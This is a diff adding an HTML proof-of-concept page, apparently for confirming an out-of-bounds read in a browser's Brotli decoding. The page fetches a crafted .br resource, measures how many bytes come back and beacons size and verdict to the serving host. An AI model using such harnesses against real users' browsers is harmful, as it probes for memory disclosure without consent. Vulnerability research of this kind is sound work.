@@ -1,0 +1,48 @@
+<!doctype html>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>oob</title>
+<style>
+  body{font:15px/1.4 -apple-system,sans-serif;margin:0;padding:16px;background:#0b0b0d;color:#e8e8ea}
+  h1{font-size:18px;margin:0 0 8px;color:#9f9}
+  .k{background:#17171b;padding:10px;border-radius:8px;font:12px/1.5 ui-monospace,monospace;white-space:pre-wrap}
+  .big{font-size:22px;color:#9f9}
+</style>
+<h1>OOB READ</h1>
+<p id="st" class="k">init…</p>
+<pre id="lg" class="k"></pre>
+<script>
+const st = document.getElementById('st'), lg = document.getElementById('lg');
+let beats = 0, pay = 0, last = 0;
+
+setInterval(() => { beats++; fetch('/hb?n=' + beats + '&p=' + pay, { cache: 'no-store' }).catch(() => {}); }, 500);
+
+function log(s) { lg.textContent += s + '\n'; }
+function kmaj(n) {
+  if (n - last < 1048576) return;
+  last = n;
+  fetch('/beacon?k=taille&v=' + n, { cache: 'no-store' }).catch(() => {});
+  st.textContent = n.toLocaleString() + ' octets';
+}
+
+log('flux legitime attendu ~5 098 o ; si OOB -> ~8 391 286 o');
+
+(async () => {
+  try {
+    const r = await fetch('/c.br?r=' + Math.random(), { cache: 'no-store' });
+    log('status ' + r.status + ' enc=' + r.headers.get('content-encoding'));
+    // lecture non-streaming : laisse le stack decoder dans un grand buffer
+    const buf = await r.arrayBuffer();
+    pay = buf.byteLength;
+    st.className = 'k big';
+    st.textContent = 'FINI ' + pay.toLocaleString() + ' octets';
+    fetch('/beacon?k=FINI&v=' + pay, { cache: 'no-store' }).catch(() => {});
+    const verdict = pay > 1000000 ? 'OOB-READ-CONFIRME' : (pay > 6000 ? 'GROSSI' : (pay > 4500 ? 'NORMAL' : 'COURT'));
+    fetch('/beacon?k=verdict&v=' + verdict, { cache: 'no-store' }).catch(() => {});
+    log('verdict: ' + verdict);
+  } catch (e) {
+    st.textContent = 'ECHEC ' + e.name;
+    fetch('/beacon?k=ECHEC&v=' + e.name, { cache: 'no-store' }).catch(() => {});
+  }
+})();
+</script>
